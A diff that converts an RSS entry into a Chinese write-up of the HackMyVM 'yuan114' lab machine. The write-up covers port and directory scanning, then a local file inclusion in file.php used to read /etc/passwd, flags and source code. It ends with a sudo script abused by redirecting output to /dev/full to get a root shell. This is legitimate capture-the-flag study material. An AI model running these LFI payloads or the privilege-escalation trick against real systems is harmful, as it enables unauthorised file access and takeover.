@@ -1,5 +1,4 @@
-<?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>记录。</title><link>https://newSoloman.github.io/CS</link><description>静下来。</description><copyright>记录。</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/61413445?v=4</url><title>avatar</title><link>https://newSoloman.github.io/CS</link></image><lastBuildDate>Tue, 30 Jun 2026 14:37:04 +0000</lastBuildDate><managingEditor>记录。</managingEditor><ttl>60</ttl><webMaster>记录。</webMaster><item><title>2026年6月30日-HackMyVm-yuan114靶机复盘</title><link>https://newSoloman.github.io/CS/post/2026-nian-6-yue-30-ri--HackMyVm-yuan114-ba-ji-fu-pan.html</link><description>一、信息收集
+一、信息收集
 1、nmap端口扫描
 ```
 ┌──(root㉿kali)-[/home/kali/Desktop]
@@ -33,7 +32,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.39 seconds
 └─# gobuster dir -u http://192.168.56.146 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,old,sql -t 50
 ===============================================================
 Gobuster v3.8
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 [+] Url:                     http://192.168.56.146
 [+] Method:                  GET
@@ -82,14 +81,14 @@ Finished
 二、漏洞复现
 ```
 ┌──(root㉿kali)-[/home/kali/Desktop]
-└─# curl 'http://192.168.56.146'                          
-&lt;!DOCTYPE html&gt;
-&lt;html lang='en'&gt;
-&lt;head&gt;
-    &lt;meta charset='UTF-8'&gt;
-    &lt;meta name='viewport' content='width=device-width, initial-scale=1.0'&gt;
-    &lt;title&gt;Welcome&lt;/title&gt;
-    &lt;style&gt;
+└─# curl "http://192.168.56.146"                          
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+    <style>
         body {
             display: flex;
             flex-direction: column;
@@ -102,16 +101,16 @@ Finished
         h1 {
             margin-bottom: 20px;
         }
-    &lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;h1&gt;Welcome to Maze-sec&lt;/h1&gt;
-    &lt;p&gt;认识的人越多 我就越喜欢狗&lt;/p&gt;
-&lt;/body&gt;
-&lt;/html&gt;
+    </style>
+</head>
+<body>
+    <h1>Welcome to Maze-sec</h1>
+    <p>认识的人越多 我就越喜欢狗</p>
+</body>
+</html>
    ```
 ```
- curl -i 'http://192.168.56.146/file.php' 
+ curl -i "http://192.168.56.146/file.php" 
 HTTP/1.0 500 Internal Server Error
 Date: Tue, 30 Jun 2026 13:27:32 GMT
 Server: Apache/2.4.62 (Debian)
@@ -122,7 +121,7 @@ Content-Type: text/html; charset=UTF-8
 这个时候应该想到LFI（本地文件包含）漏洞，对其进行模糊测试
 
 ```
-ffuf -u 'http://192.168.56.146/file.php?FUZZ=/etc/passwd' \
+ffuf -u "http://192.168.56.146/file.php?FUZZ=/etc/passwd" \
   -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
   -fs 0 -t 50
 ```
@@ -130,7 +129,7 @@ ffuf -u 'http://192.168.56.146/file.php?FUZZ=/etc/passwd' \
 
 ```
 ┌──(root㉿kali)-[/home/kali/Desktop]
-└─# curl -i 'http://192.168.56.146/file.php?file=/etc/passwd'
+└─# curl -i "http://192.168.56.146/file.php?file=/etc/passwd"
 HTTP/1.1 200 OK
 Date: Tue, 30 Jun 2026 13:40:57 GMT
 Server: Apache/2.4.62 (Debian)
@@ -169,7 +168,7 @@ welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
 
 ```
 ┌──(root㉿kali)-[/home/kali/Desktop]
-└─# curl -i 'http://192.168.56.146/file.php?file=/home/welcome/user.txt'
+└─# curl -i "http://192.168.56.146/file.php?file=/home/welcome/user.txt"
 HTTP/1.1 200 OK
 Date: Tue, 30 Jun 2026 13:42:03 GMT
 Server: Apache/2.4.62 (Debian)
@@ -185,7 +184,7 @@ flag{user-210f652e7e3b7e7359e523ef04e96295}
 
 ```
 ┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
-└─# curl -i 'http://192.168.56.146/file.php?file=php://filter/read=convert.base64-encode/resource=file.php'
+└─# curl -i "http://192.168.56.146/file.php?file=php://filter/read=convert.base64-encode/resource=file.php"
 HTTP/1.1 200 OK
 Date: Tue, 30 Jun 2026 13:45:25 GMT
 Server: Apache/2.4.62 (Debian)
@@ -195,27 +194,27 @@ Content-Type: text/html; charset=UTF-8
 
 PD9waHAKLy8gZmlsZS5waHAKJGZpbGUgPSAkX0dFVFsnZmlsZSddOwplY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKTsKPz4K                                                                                
 ┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
-└─# curl -s 'http://192.168.56.146/file.php?file=php://filter/read=convert.base64-encode/resource=file.php' | base64 -d
-&lt;?php
+└─# curl -s "http://192.168.56.146/file.php?file=php://filter/read=convert.base64-encode/resource=file.php" | base64 -d
+<?php
 // file.php
 $file = $_GET['file'];
 echo file_get_contents($file);
-?&gt;
+?>
 ```
 
 ```
 for i in $(seq 1 1000); do
-  result=$(curl -s 'http://192.168.56.146/file.php?file=/proc/$i/cmdline' \
+  result=$(curl -s "http://192.168.56.146/file.php?file=/proc/$i/cmdline" \
     --output - | strings -1 | tr '\0' ' ')
-  [ -n '$result' ] &amp;&amp; echo 'PID $i: $result'
+  [ -n "$result" ] && echo "PID $i: $result"
 done
 
 
 ┌──(root㉿kali)-[/home/kali/Desktop]
 └─# for i in $(seq 1 1000); do
-  result=$(curl -s 'http://192.168.56.146/file.php?file=/proc/$i/cmdline' \
+  result=$(curl -s "http://192.168.56.146/file.php?file=/proc/$i/cmdline" \
     --output - | strings -1 | tr '\0' ' ')
-  [ -n '$result' ] &amp;&amp; echo 'PID $i: $result'
+  [ -n "$result" ] && echo "PID $i: $result"
 done
 PID 1: /sbin/init
 PID 225: /lib/systemd/systemd-journald
@@ -286,7 +285,7 @@ ssh welcome@192.168.56.146
 
 ```
 
-&lt;img width='1321' height='440' alt='Image' src='https://github.com/user-attachments/assets/fed2a50e-04a9-410a-a98d-678e1546802d' /&gt;
+<img width="1321" height="440" alt="Image" src="https://github.com/user-attachments/assets/fed2a50e-04a9-410a-a98d-678e1546802d" />
 
 ```
 welcome@114:~$ sudo -l
@@ -300,12 +299,12 @@ User welcome may run the following commands on 114:
 welcome@114:~$ cat /opt/read.sh
 #!/bin/bash
 
-echo 'Input the flag:'
-if head -1 | grep -q '$(&lt; /root/root.txt)'
+echo "Input the flag:"
+if head -1 | grep -q "$(< /root/root.txt)"
 then
-        echo 'Y'
+        echo "Y"
 else
-        echo 'N'
+        echo "N"
 fi
 welcome@114:~$ cat /opt/short.sh
 #!/bin/bash
@@ -313,16 +312,65 @@ welcome@114:~$ cat /opt/short.sh
 PATH=/usr/bin
 My_guess=$RANDOM
 
-echo 'This is script logic'
-cat &lt;&lt; EOF
-if [ '$1' != '$My_guess' ] ;then
-    echo 'Nop'; 
+echo "This is script logic"
+cat << EOF
+if [ "$1" != "$My_guess" ] ;then
+    echo "Nop"; 
 else
     bash -i;
 fi
 EOF
 
-[ '$1' != '$My_guess' ] &amp;&amp; echo 'Nop' || bash -i
+[ "$1" != "$My_guess" ] && echo "Nop" || bash -i
 welcome@114:~$ 
 ```
-原本 short.sh 脚本是让我们从 0~32767 去猜数字，但是如果我们传入字母去猜测（比如 HELLO），它只会判断为‘不等于’然后执行 echo 'Nop'，无法进入 shell。</description><guid isPermaLink="true">https://newSoloman.github.io/CS/post/2026-nian-6-yue-30-ri--HackMyVm-yuan114-ba-ji-fu-pan.html</guid><pubDate>Tue, 30 Jun 2026 14:36:33 +0000</pubDate></item><item><title>2026年6月30日</title><link>https://newSoloman.github.io/CS/post/2026-nian-6-yue-30-ri.html</link><description>测试文章，是否成功？。</description><guid isPermaLink="true">https://newSoloman.github.io/CS/post/2026-nian-6-yue-30-ri.html</guid><pubDate>Tue, 30 Jun 2026 12:42:11 +0000</pubDate></item></channel></rss>
+原本 short.sh 脚本是让我们从 0~32767 去猜数字，但是如果我们传入字母去猜测（比如 HELLO），它只会判断为‘不等于’然后执行 echo "Nop"，无法进入 shell。
+所以，我们通过重定向污染的方式，在运行 sudo 之前，先将整个命令的标准输出（stdout）重定向到 /dev/full。这个损坏的输出环境会被 sudo 和脚本内部的所有命令继承。
+这样一来，脚本在执行到 echo "Nop" 时，因为尝试写入 /dev/full 而失败（返回非 0 退出码），导致 && 短路失效，成功触发了 || 后面的 bash -i，获得了 root 权限的 shell。
+但此时，这个 root shell 的标准输出（stdout）仍然指向 /dev/full，所以屏幕上看不到任何回显。因此，我们需要在这个 root shell 里执行 exec 1>/dev/tty，将标准输出重新指向当前终端，恢复回显。最后执行 cat /root/root.txt 拿到 flag。
+
+```
+welcome@114:~$ sudo /opt/short.sh HELLO >/dev/full
+/opt/short.sh: line 6: echo: write error: No space left on device
+cat: write error: No space left on device
+/opt/short.sh: line 15: echo: write error: No space left on device
+root@114:/home/welcome# ls
+ls: write error: No space left on device
+root@114:/home/welcome# id
+id: write error: No space left on device
+root@114:/home/welcome# exec 1>/dev/tty
+root@114:/home/welcome# id
+uid=0(root) gid=0(root) groups=0(root)
+root@114:/home/welcome# ls -la
+total 24
+drwxr-xr-x 2 welcome welcome 4096 Jan 16 18:24 .
+drwxr-xr-x 3 root    root    4096 Apr 11  2025 ..
+lrwxrwxrwx 1 root    root       9 Jan 16 18:24 .bash_history -> /dev/null
+-rw-r--r-- 1 welcome welcome  220 Apr 11  2025 .bash_logout
+-rw-r--r-- 1 welcome welcome 3526 Apr 11  2025 .bashrc
+-rw-r--r-- 1 welcome welcome  807 Apr 11  2025 .profile
+-rw-r--r-- 1 root    root      44 Jan 16 18:24 user.txt
+root@114:/home/welcome# cd /root
+root@114:~# ls 0la
+ls: cannot access '0la': No such file or directory
+root@114:~# ls -al
+total 60
+drwx------  6 root root  4096 Jan 16 18:50 .
+drwxr-xr-x 18 root root  4096 Mar 18  2025 ..
+-rw-r--r--  1 root root    21 Jan 16 18:20 114rrootpass.txt
+lrwxrwxrwx  1 root root     9 Mar 18  2025 .bash_history -> /dev/null
+-rw-r--r--  1 root root   570 Jan 31  2010 .bashrc
+drwxr-xr-x  4 root root  4096 Apr  4  2025 .cache
+drwx------  3 root root  4096 Apr  4  2025 .gnupg
+drwxr-xr-x  3 root root  4096 Mar 18  2025 .local
+-rw-r--r--  1 root root   148 Aug 17  2015 .profile
+-rw-r--r--  1 root root    44 Jan 16 18:20 root.txt
+drw-------  2 root root  4096 Apr  4  2025 .ssh
+-rw-rw-rw-  1 root root 17914 Jan 16 18:50 .viminfo
+root@114:~# cat root.txt
+flag{root-c3dbe270140775bb9fc6eaa2559f914f}
+root@114:~# 
+```
+
+
+
